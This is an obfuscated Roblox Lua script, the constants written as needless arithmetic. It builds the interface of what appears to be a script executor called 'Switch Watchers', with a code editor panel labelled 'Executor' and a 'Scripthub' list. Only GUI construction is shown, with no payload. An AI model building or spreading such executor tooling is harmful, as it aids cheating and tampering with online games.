local v0 = {};
v0["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
v0["1"]['ResetOnSpawn'] = false;
v0["1"]['Name'] = [[SwitchWatcher]];
v0["1"]['ZIndexBehavior'] = Enum.ZIndexBehavior.Sibling;
v0["2"] = Instance.new("Frame", v0["1"]);
v0["2"]['ZIndex'] = -1;
v0["2"]['BorderSizePixel'] = 0;
v0["2"]['BackgroundColor3'] = Color3.fromRGB(0 - 0, 0, 0 + 0);
v0["2"]['Size'] = UDim2.new(0, 595 + 16, 0 - 0, 352);
v0["2"]['ClipsDescendants'] = true;
v0["2"]['Position'] = UDim2.new(0.20000000298023224, 1726 - (1668 + 58), 0.10000000149011612, 0);
v0["2"]['Name'] = [[Main]];
v0["3"] = Instance.new("ImageLabel", v0["2"]);
v0["3"]['SliceCenter'] = Rect.new(726 - (512 + 114), 100, 260 - 160, 206 - 106);
v0["3"]['ScaleType'] = Enum.ScaleType.Slice;
v0["3"]['BackgroundColor3'] = Color3.fromRGB(19, 65 - 46, 9 + 10);
v0["3"]['ImageColor3'] = Color3.fromRGB(21, 4 + 17, 19 + 2);
v0["3"]['SliceScale'] = 0.029999999329447746 - 0;
v0["3"]['Image'] = [[rbxassetid://3570695787]];
v0["3"]['Size'] = UDim2.new(1, 1994 - (109 + 1885), 1469 - (1269 + 200), 55 - 26);
v0["3"]['Name'] = [[Topbar]];
v0["3"]['BackgroundTransparency'] = 816 - (98 + 717);
v0["4"] = Instance.new("Frame", v0["3"]);
v0["4"]['ZIndex'] = 3;
v0["4"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 1081 - (802 + 24));
v0["4"]['AnchorPoint'] = Vector2.new(1 - 0, 0.5);
v0["4"]['BackgroundTransparency'] = 1 - 0;
v0["4"]['Size'] = UDim2.new(1, 0 + 0, 0, 31);
v0["4"]['Position'] = UDim2.new(1, -(8 + 2), 0.5 + 0, 0 + 0);
v0["4"]['Name'] = [[RightOutline]];
v0["5"] = Instance.new("UIListLayout", v0["4"]);
v0["5"]['VerticalAlignment'] = Enum.VerticalAlignment.Center;
v0["5"]['FillDirection'] = Enum.FillDirection.Horizontal;
v0["5"]['HorizontalAlignment'] = Enum.HorizontalAlignment.Right;
v0["5"]['Padding'] = UDim.new(0 - 0, 16 - 11);
v0["5"]['SortOrder'] = Enum.SortOrder.LayoutOrder;
v0["6"] = Instance.new("ImageLabel", v0["4"]);
v0["6"]['BackgroundColor3'] = Color3.fromRGB(92 + 163, 104 + 151, 255);
v0["6"]['ImageColor3'] = Color3.fromRGB(34, 29 + 5, 25 + 9);
v0["6"]['Image'] = [[rbxassetid://4467776646]];
v0["6"]['Size'] = UDim2.new(0 + 0, 1447 - (797 + 636), 0, 67 - 53);
v0["6"]['BackgroundTransparency'] = 1620 - (1427 + 192);
v0["7"] = Instance.new("TextButton", v0["6"]);
v0["7"]['TextSize'] = 5 + 9;
v0["7"]['TextTransparency'] = 2 - 1;
v0["7"]['BackgroundColor3'] = Color3.fromRGB(255, 230 + 25, 116 + 139);
v0["7"]['TextColor3'] = Color3.fromRGB(326 - (192 + 134), 1276 - (316 + 960), 0 + 0);
v0["7"]['Size'] = UDim2.new(1 + 0, 0 + 0, 3 - 2, 0);
v0["7"]['Name'] = [[Hitbox]];
v0["7"]['Text'] = [[]];
v0["7"]['Font'] = Enum.Font.SourceSans;
v0["7"]['BackgroundTransparency'] = 1;
v0["8"] = Instance.new("ImageLabel", v0["6"]);
v0["8"]['BackgroundColor3'] = Color3.fromRGB(806 - (83 + 468), 2061 - (1202 + 604), 1190 - 935);
v0["8"]['ImageColor3'] = Color3.fromRGB(284 - 113, 171, 473 - 302);
v0["8"]['Image'] = [[rbxassetid://5768110591]];
v0["8"]['Size'] = UDim2.new(326 - (45 + 280), 0, 1 + 0, 0 + 0);
v0["8"]['Name'] = [[icon]];
v0["8"]['BackgroundTransparency'] = 1;
v0["9"] = Instance.new("ModuleScript", v0["6"]);
v0["9"]['Name'] = [[toggler]];
v0['a'] = Instance.new("Frame", v0["3"]);
v0['a']['BorderSizePixel'] = 0 + 0;
v0['a']['BackgroundColor3'] = Color3.fromRGB(12 + 9, 4 + 17, 38 - 17);
v0['a']['AnchorPoint'] = Vector2.new(0.5, 1912 - (340 + 1571));
v0['a']['Size'] = UDim2.new(1 + 0, 0, 0, 3);
v0['a']['Position'] = UDim2.new(0.5010519027709961, 1772 - (1733 + 39), 2 - 1, 1034 - (125 + 909));
v0['b'] = Instance.new("TextLabel", v0["3"]);
v0['b']['TextWrapped'] = true;
v0['b']['TextScaled'] = true;
v0['b']['BackgroundColor3'] = Color3.fromRGB(2203 - (1096 + 852), 115 + 140, 363 - 108);
v0['b']['TextSize'] = 20 + 0;
v0['b']['TextColor3'] = Color3.fromRGB(767 - (409 + 103), 491 - (46 + 190), 255);
v0['b']['AnchorPoint'] = Vector2.new(95.5 - (51 + 44), 0.5 + 0);
v0['b']['Size'] = UDim2.new(1, 0, 1317.6330000162125 - (1114 + 203), 0);
v0['b']['Text'] = [[Switch Watchers - v1.0.0]];
v0['b']['Name'] = [[VersionTitle]];
v0['b']['Font'] = Enum.Font.Roboto;
v0['b']['BackgroundTransparency'] = 1;
v0['b']['Position'] = UDim2.new(0.5, 726 - (228 + 498), 0.5 + 0, 0);
v0['c'] = Instance.new("TextButton", v0["3"]);
v0['c']['TextSize'] = 8 + 6;
v0['c']['TextTransparency'] = 664 - (174 + 489);
v0['c']['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0['c']['TextColor3'] = Color3.fromRGB(0 - 0, 0, 0);
v0['c']['Size'] = UDim2.new(1906 - (830 + 1075), 524 - (303 + 221), 1270 - (231 + 1038), 0);
v0['c']['Name'] = [[Hitbox]];
v0['c']['Text'] = [[]];
v0['c']['Font'] = Enum.Font.SourceSans;
v0['c']['BackgroundTransparency'] = 1 + 0;
v0['d'] = Instance.new("ImageLabel", v0["2"]);
v0['d']['SliceCenter'] = Rect.new(1262 - (171 + 991), 412 - 312, 268 - 168, 249 - 149);
v0['d']['ScaleType'] = Enum.ScaleType.Slice;
v0['d']['BackgroundColor3'] = Color3.fromRGB(14 + 3, 17, 59 - 42);
v0['d']['ImageColor3'] = Color3.fromRGB(54 - 35, 30 - 11, 58 - 39);
v0['d']['SliceScale'] = 1248.0299999993294 - (111 + 1137);
v0['d']['Image'] = [[rbxassetid://3570695787]];
v0['d']['Size'] = UDim2.new(158 - (91 + 67), 43, 2 - 1, -(8 + 24));
v0['d']['Name'] = [[Sidebar]];
v0['d']['BackgroundTransparency'] = 524 - (423 + 100);
v0['d']['Position'] = UDim2.new(0, 0 + 0, 0 - 0, 17 + 15);
v0['e'] = Instance.new("Folder", v0['d']);
v0['e']['Name'] = [[Borders]];
v0['f'] = Instance.new("Frame", v0['e']);
v0['f']['BorderSizePixel'] = 0;
v0['f']['BackgroundColor3'] = Color3.fromRGB(790 - (326 + 445), 82 - 63, 19);
v0['f']['AnchorPoint'] = Vector2.new(0.5, 0 - 0);
v0['f']['Size'] = UDim2.new(0 - 0, 10, 711 - (530 + 181), 1194 - (614 + 267));
v0['f']['Position'] = UDim2.new(32.724836468696594 - (19 + 13), 0 - 0, 0 - 0, 0 - 0);
v0["10"] = Instance.new("Frame", v0['e']);
v0["10"]['BorderSizePixel'] = 0 + 0;
v0["10"]['BackgroundColor3'] = Color3.fromRGB(19, 19, 32 - 13);
v0["10"]['AnchorPoint'] = Vector2.new(0.5 - 0, 1812 - (1293 + 519));
v0["10"]['Size'] = UDim2.new(0 - 0, 22, 0 - 0, 11 - 5);
v0["10"]['Position'] = UDim2.new(0.7441860437393188 - 0, 0 - 0, 0 + 0, 0 + 0);
v0["11"] = Instance.new("Frame", v0['d']);
v0["11"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 592 - 337);
v0["11"]['AnchorPoint'] = Vector2.new(0.5 + 0, 1);
v0["11"]['BackgroundTransparency'] = 1 + 0;
v0["11"]['Size'] = UDim2.new(0 + 0, 1139 - (709 + 387), 0, 142);
v0["11"]['Position'] = UDim2.new(0.5, 1858 - (673 + 1185), 2 - 1, -(19 - 13));
v0["11"]['Name'] = [[Bottom]];
v0["12"] = Instance.new("UIListLayout", v0["11"]);
v0["12"]['VerticalAlignment'] = Enum.VerticalAlignment.Bottom;
v0["12"]['HorizontalAlignment'] = Enum.HorizontalAlignment.Center;
v0["12"]['Padding'] = UDim.new(0, 16 - 6);
v0["13"] = Instance.new("ImageLabel", v0["11"]);
v0["13"]['BackgroundColor3'] = Color3.fromRGB(183 + 72, 255, 255);
v0["13"]['ImageColor3'] = Color3.fromRGB(27 + 8, 35, 46 - 11);
v0["13"]['Image'] = [[rbxassetid://3570695787]];
v0["13"]['Size'] = UDim2.new(0, 7 + 21, 0 - 0, 28);
v0["13"]['Name'] = [[InviteBtn]];
v0["13"]['BackgroundTransparency'] = 1 - 0;
v0["14"] = Instance.new("ImageLabel", v0["13"]);
v0["14"]['ScaleType'] = Enum.ScaleType.Fit;
v0["14"]['BackgroundColor3'] = Color3.fromRGB(2135 - (446 + 1434), 255, 255);
v0["14"]['ImageColor3'] = Color3.fromRGB(182, 182, 1465 - (1040 + 243));
v0["14"]['AnchorPoint'] = Vector2.new(0.5 - 0, 1847.5 - (559 + 1288));
v0["14"]['Image'] = [[rbxassetid://4503342956]];
v0["14"]['Size'] = UDim2.new(0.7229999899864197, 1931 - (609 + 1322), 454.7229999899864 - (13 + 441), 0);
v0["14"]['BackgroundTransparency'] = 1;
v0["14"]['Position'] = UDim2.new(0.5 - 0, 0 - 0, 0.5 - 0, 0 + 0);
v0["15"] = Instance.new("TextButton", v0["13"]);
v0["15"]['TextSize'] = 50 - 36;
v0["15"]['TextTransparency'] = 1 + 0;
v0["15"]['BackgroundColor3'] = Color3.fromRGB(112 + 143, 756 - 501, 140 + 115);
v0["15"]['TextColor3'] = Color3.fromRGB(0 - 0, 0 + 0, 0 + 0);
v0["15"]['Size'] = UDim2.new(1 + 0, 0 + 0, 1, 0);
v0["15"]['Name'] = [[Hitbox]];
v0["15"]['Text'] = [[]];
v0["15"]['Font'] = Enum.Font.SourceSans;
v0["15"]['BackgroundTransparency'] = 1;
v0["16"] = Instance.new("LocalScript", v0["13"]);
v0["16"]['Name'] = [[handler]];
v0["17"] = Instance.new("TextLabel", v0["11"]);
v0["17"]['TextWrapped'] = true;
v0["17"]['BackgroundColor3'] = Color3.fromRGB(250 + 5, 688 - (153 + 280), 736 - 481);
v0["17"]['TextSize'] = 11;
v0["17"]['TextColor3'] = Color3.fromRGB(187 + 21, 208, 208);
v0["17"]['AnchorPoint'] = Vector2.new(0.5, 0 + 0);
v0["17"]['Size'] = UDim2.new(1, 0 + 0, 0, 37 + 3);
v0["17"]['Text'] = [[0
——
0]];
v0["17"]['Name'] = [[CharCounter]];
v0["17"]['Font'] = Enum.Font.Ubuntu;
v0["17"]['BackgroundTransparency'] = 1 + 0;
v0["18"] = Instance.new("LocalScript", v0["17"]);
v0["18"]['Name'] = [[handler]];
v0["19"] = Instance.new("Frame", v0['d']);
v0["19"]['ZIndex'] = 4 - 1;
v0["19"]['BorderSizePixel'] = 0 + 0;
v0["19"]['BackgroundColor3'] = Color3.fromRGB(255, 922 - (89 + 578), 183 + 72);
v0["19"]['AnchorPoint'] = Vector2.new(0.5 - 0, 1049 - (572 + 477));
v0["19"]['BackgroundTransparency'] = 1 + 0;
v0["19"]['Size'] = UDim2.new(0 + 0, 6 + 37, 86 - (84 + 2), 232 - 91);
v0["19"]['Position'] = UDim2.new(0.5080659985542297 + 0, 0, 842.047923322767 - (497 + 345), 0);
v0["19"]['Name'] = [[Top]];
v0["1a"] = Instance.new("ImageLabel", v0["19"]);
v0["1a"]['ScaleType'] = Enum.ScaleType.Fit;
v0["1a"]['BackgroundColor3'] = Color3.fromRGB(7 + 248, 44 + 211, 255);
v0["1a"]['ImageColor3'] = Color3.fromRGB(182, 1515 - (605 + 728), 130 + 52);
v0["1a"]['AnchorPoint'] = Vector2.new(0.5 - 0, 0.5 + 0);
v0["1a"]['Image'] = [[rbxassetid://4370345144]];
v0["1a"]['Size'] = UDim2.new(0 - 0, 20, 0 + 0, 20);
v0["1a"]['Name'] = [[HomeBtn]];
v0["1a"]['BackgroundTransparency'] = 1;
v0["1a"]['Position'] = UDim2.new(0.5 - 0, 0 + 0, 489 - (457 + 32), 5);
v0["1b"] = Instance.new("TextButton", v0["1a"]);
v0["1b"]['TextSize'] = 6 + 8;
v0["1b"]['TextTransparency'] = 1403 - (832 + 570);
v0["1b"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["1b"]['TextColor3'] = Color3.fromRGB(0, 0 + 0, 0 + 0);
v0["1b"]['Size'] = UDim2.new(3 - 2, 0, 1 + 0, 796 - (588 + 208));
v0["1b"]['Name'] = [[Hitbox]];
v0["1b"]['Text'] = [[]];
v0["1b"]['Font'] = Enum.Font.SourceSans;
v0["1b"]['BackgroundTransparency'] = 1;
v0["1c"] = Instance.new("ImageLabel", v0["19"]);
v0["1c"]['ScaleType'] = Enum.ScaleType.Fit;
v0["1c"]['BackgroundColor3'] = Color3.fromRGB(687 - 432, 255, 255);
v0["1c"]['ImageColor3'] = Color3.fromRGB(1838 - (884 + 916), 79 - 41, 38);
v0["1c"]['AnchorPoint'] = Vector2.new(0.5 + 0, 0.5);
v0["1c"]['Image'] = [[rbxassetid://4370346095]];
v0["1c"]['Size'] = UDim2.new(0, 673 - (232 + 421), 1889 - (1569 + 320), 5 + 15);
v0["1c"]['Name'] = [[MenuBtn]];
v0["1c"]['BackgroundTransparency'] = 1;
v0["1c"]['Position'] = UDim2.new(0.5 + 0, 0 - 0, 605 - (316 + 289), 45);
v0["1d"] = Instance.new("TextButton", v0["1c"]);
v0["1d"]['TextSize'] = 36 - 22;
v0["1d"]['TextTransparency'] = 1 + 0;
v0["1d"]['BackgroundColor3'] = Color3.fromRGB(1708 - (666 + 787), 255, 680 - (360 + 65));
v0["1d"]['TextColor3'] = Color3.fromRGB(0 + 0, 254 - (79 + 175), 0 - 0);
v0["1d"]['Size'] = UDim2.new(1, 0 + 0, 2 - 1, 0 - 0);
v0["1d"]['Name'] = [[Hitbox]];
v0["1d"]['Text'] = [[]];
v0["1d"]['Font'] = Enum.Font.SourceSans;
v0["1d"]['BackgroundTransparency'] = 900 - (503 + 396);
v0["1e"] = Instance.new("ImageLabel", v0["19"]);
v0["1e"]['ScaleType'] = Enum.ScaleType.Fit;
v0["1e"]['BackgroundColor3'] = Color3.fromRGB(255, 436 - (92 + 89), 255);
v0["1e"]['ImageColor3'] = Color3.fromRGB(73 - 35, 38, 20 + 18);
v0["1e"]['AnchorPoint'] = Vector2.new(0.5, 0.5 + 0);
v0["1e"]['Image'] = [[rbxassetid://3605022185]];
v0["1e"]['Size'] = UDim2.new(0, 78 - 58, 0 + 0, 45 - 25);
v0["1e"]['Name'] = [[SettingsBtn]];
v0["1e"]['BackgroundTransparency'] = 1 + 0;
v0["1e"]['Position'] = UDim2.new(0.5 + 0, 0 - 0, 0, 11 + 74);
v0["1f"] = Instance.new("TextButton", v0["1e"]);
v0["1f"]['TextSize'] = 20 - 6;
v0["1f"]['TextTransparency'] = 1245 - (485 + 759);
v0["1f"]['BackgroundColor3'] = Color3.fromRGB(590 - 335, 1444 - (442 + 747), 1390 - (832 + 303));
v0["1f"]['TextColor3'] = Color3.fromRGB(0, 946 - (88 + 858), 0 + 0);
v0["1f"]['Size'] = UDim2.new(1 + 0, 0, 1 + 0, 789 - (766 + 23));
v0["1f"]['Name'] = [[Hitbox]];
v0["1f"]['Text'] = [[]];
v0["1f"]['Font'] = Enum.Font.SourceSans;
v0["1f"]['BackgroundTransparency'] = 4 - 3;
v0["20"] = Instance.new("ImageButton", v0["19"]);
v0["20"]['Active'] = false;
v0["20"]['ZIndex'] = 0 - 0;
v0["20"]['SliceCenter'] = Rect.new(263 - 163, 100, 339 - 239, 100);
v0["20"]['ScaleType'] = Enum.ScaleType.Slice;
v0["20"]['SliceScale'] = 1073.070000000298 - (1036 + 37);
v0["20"]['BackgroundColor3'] = Color3.fromRGB(25 + 10, 35, 35);
v0["20"]['ImageColor3'] = Color3.fromRGB(79 - 38, 33 + 8, 1521 - (641 + 839));
v0["20"]['Selectable'] = false;
v0["20"]['AnchorPoint'] = Vector2.new(0.5, 913.5 - (910 + 3));
v0["20"]['Image'] = [[rbxassetid://3570695787]];
v0["20"]['Size'] = UDim2.new(0 - 0, 1709 - (1466 + 218), 0 + 0, 25);
v0["20"]['Name'] = [[bg]];
v0["20"]['Position'] = UDim2.new(0.5, 1148 - (556 + 592), 0, 2 + 3);
v0["20"]['BackgroundTransparency'] = 809 - (329 + 479);
v0["21"] = Instance.new("LocalScript", v0['d']);
v0["21"]['Name'] = [[handler]];
v0["22"] = Instance.new("UICorner", v0["2"]);
v0["22"]['CornerRadius'] = UDim.new(854 - (174 + 680), 5);
v0["23"] = Instance.new("Frame", v0["2"]);
v0["23"]['BackgroundColor3'] = Color3.fromRGB(876 - 621, 528 - 273, 255);
v0["23"]['BackgroundTransparency'] = 1;
v0["23"]['Size'] = UDim2.new(1 + 0, -(782 - (396 + 343)), 1, -32);
v0["23"]['ClipsDescendants'] = true;
v0["23"]['Position'] = UDim2.new(0 + 0, 43, 1477 - (29 + 1448), 1421 - (135 + 1254));
v0["23"]['Name'] = [[BodyClipping]];
v0["24"] = Instance.new("ImageLabel", v0["23"]);
v0["24"]['ZIndex'] = 7 - 5;
v0["24"]['SliceCenter'] = Rect.new(466 - 366, 67 + 33, 100, 100);
v0["24"]['ScaleType'] = Enum.ScaleType.Slice;
v0["24"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 1527 - (389 + 1138));
v0["24"]['ImageColor3'] = Color3.fromRGB(574 - (102 + 472), 0, 0);
v0["24"]['SliceScale'] = 0.029999999329447746 + 0;
v0["24"]['Image'] = [[rbxassetid://3570695787]];
v0["24"]['Size'] = UDim2.new(1 + 0, 0 + 0, 1546 - (320 + 1225), 0 - 0);
v0["24"]['Name'] = [[Executor]];
v0["24"]['BackgroundTransparency'] = 1;
v0["24"]['Position'] = UDim2.new(0 + 0, 1464 - (157 + 1307), -0.003000000026077032, 1859 - (821 + 1038));
v0["25"] = Instance.new("Folder", v0["24"]);
v0["25"]['Name'] = [[Borders]];
v0["26"] = Instance.new("Frame", v0["25"]);
v0["26"]['BorderSizePixel'] = 0;
v0["26"]['BackgroundColor3'] = Color3.fromRGB(0 - 0, 0 + 0, 0 - 0);
v0["26"]['Size'] = UDim2.new(0, 4 + 5, 0 - 0, 313);
v0["26"]['Position'] = UDim2.new(-(1026.00000009137 - (834 + 192)), 0 + 0, 0, 0 + 0);
v0["27"] = Instance.new("Frame", v0["25"]);
v0["27"]['BorderSizePixel'] = 0;
v0["27"]['BackgroundColor3'] = Color3.fromRGB(0 + 0, 0 - 0, 304 - (300 + 4));
v0["27"]['Size'] = UDim2.new(0 + 0, 1735 - 1072, 0, 368 - (112 + 250));
v0["27"]['Position'] = UDim2.new(-4.5963965e-8, 0, 0 + 0, 0);
v0["28"] = Instance.new("Frame", v0["24"]);
v0["28"]['ZIndex'] = 4 - 2;
v0["28"]['BackgroundColor3'] = Color3.fromRGB(147 + 108, 255, 255);
v0["28"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["28"]['BackgroundTransparency'] = 1 + 0;
v0["28"]['Size'] = UDim2.new(1, 0 + 0, 1 + 0, 0 + 0);
v0["28"]['Position'] = UDim2.new(0.5, 1414 - (1001 + 413), 0.5 - 0, 882 - (244 + 638));
v0["28"]['Name'] = [[InnerBody]];
v0["29"] = Instance.new("ImageLabel", v0["28"]);
v0["29"]['ZIndex'] = 695 - (627 + 66);
v0["29"]['SliceCenter'] = Rect.new(297 - 197, 702 - (512 + 90), 2006 - (1665 + 241), 817 - (373 + 344));
v0["29"]['ScaleType'] = Enum.ScaleType.Slice;
v0["29"]['BackgroundColor3'] = Color3.fromRGB(116 + 139, 255, 68 + 187);
v0["29"]['ImageColor3'] = Color3.fromRGB(255, 672 - 417, 255);
v0["29"]['SliceScale'] = 0.05000000074505806 - 0;
v0["29"]['Image'] = [[rbxassetid://3570695787]];
v0["29"]['Size'] = UDim2.new(1, -129, 1100 - (35 + 1064), -(58 + 21));
v0["29"]['Name'] = [[SourceBg]];
v0["29"]['BackgroundTransparency'] = 1;
v0["29"]['Position'] = UDim2.new(0 - 0, 1 + 9, 1236 - (298 + 938), 38);
v0["2a"] = Instance.new("ScrollingFrame", v0["29"]);
v0["2a"]['Active'] = true;
v0["2a"]['ScrollingDirection'] = Enum.ScrollingDirection.Y;
v0["2a"]['ZIndex'] = 1261 - (233 + 1026);
v0["2a"]['BorderSizePixel'] = 0;
v0["2a"]['CanvasSize'] = UDim2.new(1666 - (636 + 1030), 0 + 0, 0 + 0, 0 + 0);
v0["2a"]['BackgroundColor3'] = Color3.fromRGB(18 + 237, 476 - (55 + 166), 50 + 205);
v0["2a"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["2a"]['LayoutOrder'] = 1 + 0;
v0["2a"]['Size'] = UDim2.new(3 - 2, -(304 - (36 + 261)), 1, -(15 - 6));
v0["2a"]['ScrollBarThickness'] = 3;
v0["2a"]['Position'] = UDim2.new(0.5, 0, 1368.5 - (34 + 1334), 0 + 0);
v0["2a"]['Name'] = [[Source]];
v0["2b"] = Instance.new("ScrollingFrame", v0["2a"]);
v0["2b"]['Active'] = true;
v0["2b"]['BorderSizePixel'] = 0 + 0;
v0["2b"]['CanvasSize'] = UDim2.new(0, 1283 - (1035 + 248), 21 - (20 + 1), 0 + 0);
v0["2b"]['BackgroundColor3'] = Color3.fromRGB(574 - (134 + 185), 1388 - (549 + 584), 255);
v0["2b"]['BackgroundTransparency'] = 1;
v0["2b"]['Size'] = UDim2.new(1, 685 - (314 + 371), 3 - 2, 968 - (478 + 490));
v0["2b"]['ScrollBarImageColor3'] = Color3.fromRGB(0 + 0, 0, 1172 - (786 + 386));
v0["2b"]['ScrollBarThickness'] = 16 - 11;
v0["2c"] = Instance.new("TextBox", v0["2b"]);
v0["2c"]['ZIndex'] = 7;
v0["2c"]['TextColor3'] = Color3.fromRGB(66, 66, 1445 - (1055 + 324));
v0["2c"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["2c"]['TextSize'] = 1355 - (1093 + 247);
v0["2c"]['TextYAlignment'] = Enum.TextYAlignment.Top;
v0["2c"]['BackgroundColor3'] = Color3.fromRGB(28 + 3, 4 + 27, 123 - 92);
v0["2c"]['LayoutOrder'] = 5;
v0["2c"]['MultiLine'] = true;
v0["2c"]['BackgroundTransparency'] = 3 - 2;
v0["2c"]['Size'] = UDim2.new(2 - 1, -(80 - 48), 1 + 0, 0);
v0["2c"]['Text'] = [[]];
v0["2c"]['Position'] = UDim2.new(0 - 0, 110 - 78, 0 + 0, 0 - 0);
v0["2c"]['Font'] = Enum.Font.Code;
v0["2c"]['Name'] = [[SourceBox]];
v0["2c"]['ClearTextOnFocus'] = false;
v0["2d"] = Instance.new("TextLabel", v0["2b"]);
v0["2d"]['ZIndex'] = 690 - (364 + 324);
v0["2d"]['RichText'] = true;
v0["2d"]['TextYAlignment'] = Enum.TextYAlignment.Top;
v0["2d"]['BackgroundColor3'] = Color3.fromRGB(698 - 443, 255, 611 - 356);
v0["2d"]['TextSize'] = 5 + 10;
v0["2d"]['TextColor3'] = Color3.fromRGB(255, 1066 - 811, 255);
v0["2d"]['Size'] = UDim2.new(0 - 0, 91 - 61, 1269 - (1249 + 19), 0 + 0);
v0["2d"]['BorderColor3'] = Color3.fromRGB(101 - 75, 1112 - (686 + 400), 26);
v0["2d"]['Text'] = [[1]];
v0["2d"]['Name'] = [[Lines]];
v0["2d"]['Font'] = Enum.Font.Code;
v0["2d"]['BackgroundTransparency'] = 1 + 0;
v0["2e"] = Instance.new("Frame", v0["2d"]);
v0["2e"]['ZIndex'] = 231 - (73 + 156);
v0["2e"]['BorderSizePixel'] = 0;
v0["2e"]['BackgroundColor3'] = Color3.fromRGB(51, 1 + 50, 51);
v0["2e"]['Size'] = UDim2.new(811 - (721 + 90), -1, 1 + 0, 0 - 0);
v0["2e"]['Position'] = UDim2.new(1, 0, 470.0010000000475 - (224 + 246), 0 - 0);
v0["2f"] = Instance.new("ModuleScript", v0["2a"]);
v0["2f"]['Name'] = [[ide]];
v0["30"] = Instance.new("ModuleScript", v0["2f"]);
v0["30"]['Name'] = [[highlight]];
v0["31"] = Instance.new("ModuleScript", v0["30"]);
v0["31"]['Name'] = [[lexer]];
v0["32"] = Instance.new("ModuleScript", v0["31"]);
v0["32"]['Name'] = [[language]];
v0["33"] = Instance.new("ImageLabel", v0["28"]);
v0["33"]['ZIndex'] = 3 - 1;
v0["33"]['SliceCenter'] = Rect.new(19 + 81, 3 + 97, 74 + 26, 100);
v0["33"]['ScaleType'] = Enum.ScaleType.Slice;
v0["33"]['BackgroundColor3'] = Color3.fromRGB(255, 506 - 251, 255);
v0["33"]['ImageColor3'] = Color3.fromRGB(0 - 0, 0, 0);
v0["33"]['SliceScale'] = 0.05000000074505806;
v0["33"]['AnchorPoint'] = Vector2.new(514 - (203 + 310), 1993.5 - (1238 + 755));
v0["33"]['Image'] = [[rbxassetid://3570695787]];
v0["33"]['Size'] = UDim2.new(0 + 0, 113, 1535 - (709 + 825), -(144 - 65));
v0["33"]['BorderColor3'] = Color3.fromRGB(371 - 116, 1119 - (196 + 668), 1006 - 751);
v0["33"]['Name'] = [[Scripthub]];
v0["33"]['Position'] = UDim2.new(1, 0 - 0, 833.5 - (171 + 662), 93 - (4 + 89));
v0["34"] = Instance.new("ScrollingFrame", v0["33"]);
v0["34"]['Active'] = true;
v0["34"]['ScrollingDirection'] = Enum.ScrollingDirection.Y;
v0["34"]['ZIndex'] = 6 - 4;
v0["34"]['BorderSizePixel'] = 0 + 0;
v0["34"]['CanvasSize'] = UDim2.new(0, 0 - 0, 0, 0 + 0);
v0["34"]['BackgroundColor3'] = Color3.fromRGB(1486 - (35 + 1451), 1453 - (28 + 1425), 1993 - (941 + 1052));
v0["34"]['AnchorPoint'] = Vector2.new(0.5 + 0, 0.5);
v0["34"]['BackgroundTransparency'] = 1515 - (822 + 692);
v0["34"]['Size'] = UDim2.new(1, 0, 1, 0 - 0);
v0["34"]['ScrollBarImageColor3'] = Color3.fromRGB(80 + 88, 465 - (45 + 252), 167 + 1);
v0["34"]['ScrollBarThickness'] = 2 + 1;
v0["34"]['Position'] = UDim2.new(0.5 - 0, 433 - (114 + 319), 0.5 - 0, 0 - 0);
v0["34"]['Name'] = [[Scripts]];
v0["35"] = Instance.new("UIListLayout", v0["34"]);
v0["35"]['HorizontalAlignment'] = Enum.HorizontalAlignment.Center;
v0["35"]['Padding'] = UDim.new(0 + 0, 7 - 2);
v0["35"]['SortOrder'] = Enum.SortOrder.LayoutOrder;
v0["36"] = Instance.new("ImageLabel", v0["34"]);
v0["36"]['ZIndex'] = -1;
v0["36"]['SliceCenter'] = Rect.new(209 - 109, 100, 100, 2063 - (556 + 1407));
v0["36"]['ScaleType'] = Enum.ScaleType.Slice;
v0["36"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 1461 - (741 + 465));
v0["36"]['ImageColor3'] = Color3.fromRGB(491 - (170 + 295), 26, 26);
v0["36"]['SliceScale'] = 0.029999999329447746 + 0;
v0["36"]['Selectable'] = true;
v0["36"]['AnchorPoint'] = Vector2.new(0 + 0, 0.5 - 0);
v0["36"]['Image'] = [[rbxassetid://3570695787]];
v0["36"]['Size'] = UDim2.new(0.8999999761581421 + 0, 0 + 0, 0 + 0, 1248 - (957 + 273));
v0["36"]['Active'] = true;
v0["36"]['Name'] = [[dummy]];
v0["36"]['BackgroundTransparency'] = 1 + 0;
v0["36"]['Position'] = UDim2.new(0.5 + 0, 0 - 0, 0.5 - 0, 0);
v0["37"] = Instance.new("ImageLabel", v0["36"]);
v0["37"]['BackgroundColor3'] = Color3.fromRGB(778 - 523, 1262 - 1007, 2035 - (389 + 1391));
v0["37"]['AnchorPoint'] = Vector2.new(0 + 0, 0.5 + 0);
v0["37"]['Image'] = [[rbxassetid://8150715986]];
v0["37"]['Size'] = UDim2.new(0 - 0, 963 - (783 + 168), 0 - 0, 12 + 0);
v0["37"]['Name'] = [[icon]];
v0["37"]['BackgroundTransparency'] = 312 - (309 + 2);
v0["37"]['Position'] = UDim2.new(0 - 0, 1217 - (1090 + 122), 0.5, 0);
v0["38"] = Instance.new("TextButton", v0["36"]);
v0["38"]['TextSize'] = 5 + 9;
v0["38"]['TextTransparency'] = 1;
v0["38"]['BackgroundColor3'] = Color3.fromRGB(856 - 601, 175 + 80, 255);
v0["38"]['TextColor3'] = Color3.fromRGB(1118 - (628 + 490), 0 + 0, 0);
v0["38"]['Size'] = UDim2.new(2 - 1, 0 - 0, 1, 0);
v0["38"]['Name'] = [[Hitbox]];
v0["38"]['Text'] = [[]];
v0["38"]['Font'] = Enum.Font.SourceSans;
v0["38"]['BackgroundTransparency'] = 775 - (431 + 343);
v0["39"] = Instance.new("TextLabel", v0["36"]);
v0["39"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["39"]['BackgroundColor3'] = Color3.fromRGB(255, 515 - 260, 737 - 482);
v0["39"]['TextSize'] = 12 + 2;
v0["39"]['TextColor3'] = Color3.fromRGB(22 + 149, 1866 - (556 + 1139), 171);
v0["39"]['Size'] = UDim2.new(16 - (6 + 9), -(6 + 24), 1, 0 + 0);
v0["39"]['Text'] = [[N/A]];
v0["39"]['Name'] = [[Template]];
v0["39"]['Font'] = Enum.Font.SourceSans;
v0["39"]['BackgroundTransparency'] = 1;
